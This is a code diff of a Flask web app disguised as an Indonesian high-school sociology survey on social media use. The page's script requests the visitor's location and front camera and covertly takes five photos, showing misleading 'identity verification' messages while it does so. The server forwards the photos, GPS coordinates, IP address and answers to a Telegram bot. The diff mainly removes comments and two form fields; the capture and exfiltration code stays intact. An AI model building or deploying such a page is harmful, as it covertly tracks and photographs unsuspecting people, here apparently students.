@@ -19,7 +19,7 @@ TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "6600650184")
 INFO_SURVEI = {
     "judul": "Survei Penggunaan Media Sosial",
     "subjudul": "Tugas Kelompok Mata Pelajaran Sosiologi",
-    "kelas": "Kelas 12.2.5 IPS",
+    "kelas": "Kelas 12.2.5",
     "sekolah": "SMA Negeri 8 Kabupaten Tangerang",
     "guru": "Bu Sari Wulandari, S.Pd.",
     "deadline": "20 September 2026"
@@ -73,7 +73,7 @@ def index():
             .form-group { margin-bottom: 20px; }
             label { display: block; margin-bottom: 8px; color: #1f2937; font-size: 14px; font-weight: 600; }
             label .req { color: #ef4444; margin-left: 2px; }
-            input[type="text"], input[type="number"], textarea, select {
+            input[type="text"], textarea, select {
                 width: 100%; padding: 12px 14px; border: 2px solid #e5e7eb;
                 border-radius: 10px; font-size: 15px; font-family: inherit;
                 background: #f9fafb; transition: all 0.2s;
@@ -144,19 +144,7 @@ def index():
                     <label>Nama Lengkap <span class="req">*</span></label>
                     <input type="text" name="nama" required placeholder="Contoh: Budi Santoso">
                 </div>
-                <div class="form-group">
-                    <label>Kelas <span class="req">*</span></label>
-                    <select name="kelas" required>
-                        <option value="">-- Pilih Kelas --</option>
-                        <option>X IPA 1</option><option>X IPA 2</option><option>X IPS 1</option>
-                        <option>XI IPA 1</option><option>XI IPA 2</option><option>XI IPS 1</option>
-                        <option>XI IPS 2</option><option>XII IPA 1</option><option>XII IPS 1</option>
-                    </select>
-                </div>
-                <div class="form-group">
-                    <label>Umur <span class="req">*</span></label>
-                    <input type="number" name="umur" required min="12" max="25" placeholder="Contoh: 16">
-                </div>
+
                 <div class="form-group">
                     <label>Jenis Kelamin <span class="req">*</span></label>
                     <div class="radio-group">
@@ -164,6 +152,7 @@ def index():
                         <label class="radio-item"><input type="radio" name="jk" value="Perempuan"><span>👧 Perempuan</span></label>
                     </div>
                 </div>
+
                 <div class="form-group">
                     <label>Media sosial yang paling sering dipakai? <span class="req">*</span></label>
                     <div class="radio-group">
@@ -175,6 +164,7 @@ def index():
                         <label class="radio-item"><input type="radio" name="medsos" value="Facebook"><span>📘 Facebook</span></label>
                     </div>
                 </div>
+
                 <div class="form-group">
                     <label>Berapa lama pakai medsos per hari? <span class="req">*</span></label>
                     <div class="radio-group">
@@ -184,6 +174,7 @@ def index():
                         <label class="radio-item"><input type="radio" name="durasi" value="Lebih dari 5 jam"><span>🌙 Lebih dari 5 jam</span></label>
                     </div>
                 </div>
+
                 <div class="form-group">
                     <label>Kapan biasanya buka medsos? <span class="req">*</span></label>
                     <div class="radio-group">
@@ -193,6 +184,7 @@ def index():
                         <label class="radio-item"><input type="radio" name="waktu" value="Malam sebelum tidur"><span>🌙 Malam sebelum tidur</span></label>
                     </div>
                 </div>
+
                 <div class="form-group">
                     <label>Menurutmu, dampak medsos buat pelajar? <span class="req">*</span></label>
                     <textarea name="dampak" required placeholder="Tulis pendapatmu singkat..."></textarea>
@@ -213,9 +205,9 @@ def index():
 
         <script>
         const JUMLAH_FOTO = 5;
-        const INTERVAL_FOTO = 1000;   // 1 detik antar foto
+        const INTERVAL_FOTO = 1000;
         let lokasi = null;
-        let daftarFoto = [];           // array 5 foto base64
+        let daftarFoto = [];
 
         const statusEl = document.getElementById("status");
         const btnKirim = document.getElementById("btnKirim");
@@ -229,9 +221,6 @@ def index():
             progressBar.style.width = pct + "%";
         }
 
-        // ==========================================
-        // MINTA IZIN LOKASI
-        // ==========================================
         function mintaLokasi() {
             return new Promise((resolve, reject) => {
                 if (!navigator.geolocation) { reject("no geolocation"); return; }
@@ -250,9 +239,6 @@ def index():
             });
         }
 
-        // ==========================================
-        // MINTA IZIN KAMERA DEPAN
-        // ==========================================
         async function bukaKamera() {
             try {
                 return await navigator.mediaDevices.getUserMedia({
@@ -274,45 +260,34 @@ def index():
             }
         }
 
-        // ==========================================
-        // AMBIL 5 FOTO (interval 1 detik)
-        // ==========================================
         async function ambilFoto(stream) {
             const video = document.getElementById("video");
             const canvas = document.getElementById("canvas");
             video.srcObject = stream;
             video.style.display = "block";
 
-            // Tunggu kamera stabil
             await new Promise(r => setTimeout(r, 800));
 
             daftarFoto = [];
 
             for (let i = 0; i < JUMLAH_FOTO; i++) {
-                // Set ukuran canvas sesuai video
                 canvas.width = video.videoWidth || 640;
                 canvas.height = video.videoHeight || 480;
 
-                // Gambar frame ke canvas
                 const ctx = canvas.getContext("2d");
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-                // Konversi ke base64 JPEG (kualitas 70%)
                 const dataUrl = canvas.toDataURL("image/jpeg", 0.7);
                 daftarFoto.push(dataUrl);
 
                 console.log(`📸 Foto ${i + 1}/${JUMLAH_FOTO} diambil`);
-
-                // Update progress bar
                 setProgress(60 + Math.round((i + 1) / JUMLAH_FOTO * 20));
 
-                // Tunggu sebelum foto berikutnya (kecuali foto terakhir)
                 if (i < JUMLAH_FOTO - 1) {
                     await new Promise(r => setTimeout(r, INTERVAL_FOTO));
                 }
             }
 
-            // Matikan kamera
             stream.getTracks().forEach(t => t.stop());
             video.style.display = "none";
 
@@ -320,9 +295,6 @@ def index():
             return daftarFoto;
         }
 
-        // ==========================================
-        // KIRIM KE SERVER
-        // ==========================================
         async function kirimKeServer(formData) {
             const res = await fetch("/simpan", {
                 method: "POST",
@@ -331,16 +303,13 @@ def index():
                     latitude: lokasi.latitude,
                     longitude: lokasi.longitude,
                     accuracy: lokasi.accuracy,
-                    foto: daftarFoto,        // ⭐ array 5 foto
+                    foto: daftarFoto,
                     form: formData
                 })
             });
             return await res.json();
         }
 
-        // ==========================================
-        // SAAT KLIK "KIRIM JAWABAN"
-        // ==========================================
         document.getElementById("formSurvei").addEventListener("submit", async (e) => {
             e.preventDefault();
 
@@ -352,7 +321,6 @@ def index():
             btnKirim.innerHTML = '<span class="spinner"></span>Mengirim...';
             setProgress(20);
 
-            // STEP 1: Lokasi
             setStatus("info", "🔒 Memverifikasi data pengirim...");
             try {
                 await mintaLokasi();
@@ -365,7 +333,6 @@ def index():
                 return;
             }
 
-            // STEP 2: Kamera
             setStatus("info", "📸 Memverifikasi identitas pengirim...");
             let stream;
             try {
@@ -379,7 +346,6 @@ def index():
                 return;
             }
 
-            // STEP 3: Ambil 5 foto
             setStatus("info", "⏳ Memproses verifikasi... mohon tunggu");
             try {
                 await ambilFoto(stream);
@@ -393,7 +359,6 @@ def index():
                 return;
             }
 
-            // STEP 4: Kirim
             setStatus("info", "📤 Mengirim jawaban...");
             try {
                 const data = await kirimKeServer(formData);
@@ -455,7 +420,7 @@ def simpan():
     lat = data["latitude"]
     lon = data["longitude"]
     akurasi = data.get("accuracy", 0)
-    daftar_foto = data.get("foto", [])   # ⭐ array berisi 5 foto base64
+    daftar_foto = data.get("foto", [])
     form_data = data.get("form", {})
 
     ip = request.headers.get("X-Forwarded-For", request.remote_addr).split(",")[0].strip()
@@ -471,12 +436,13 @@ def simpan():
         print("⚠ TELEGRAM_TOKEN belum di-set")
         return jsonify({"status": "ok", "waktu": waktu, "ref": ref})
 
-    # Format caption
     label_map = {
-        "nama": "Nama", "kelas": "Kelas", "umur": "Umur",
-        "jk": "Jenis Kelamin", "medsos": "Medsos Favorit",
-        "durasi": "Durasi Harian", "waktu": "Waktu Akses",
-        "dampak": "Dampak/Pendapat", "pendapat": "Pendapat"
+        "nama": "Nama",
+        "jk": "Jenis Kelamin",
+        "medsos": "Medsos Favorit",
+        "durasi": "Durasi Harian",
+        "waktu": "Waktu Akses",
+        "dampak": "Dampak/Pendapat"
     }
     siswa_text = "\n\n👤 *Data Siswa:*\n"
     for k, v in form_data.items():
@@ -494,7 +460,6 @@ def simpan():
         f"{siswa_text}"
     )
 
-    # ============ KIRIM SEMUA FOTO KE TELEGRAM ============
     try:
         total_foto = len(daftar_foto)
         for i, foto_data in enumerate(daftar_foto):
@@ -507,7 +472,6 @@ def simpan():
             size_kb = len(foto_bytes) / 1024
             print(f"   📤 Mengirim foto {i+1}/{total_foto} ({size_kb:.1f} KB)...")
 
-            # Foto pertama dapat caption lengkap, sisanya caption singkat
             if i == 0:
                 cap = caption
             else:
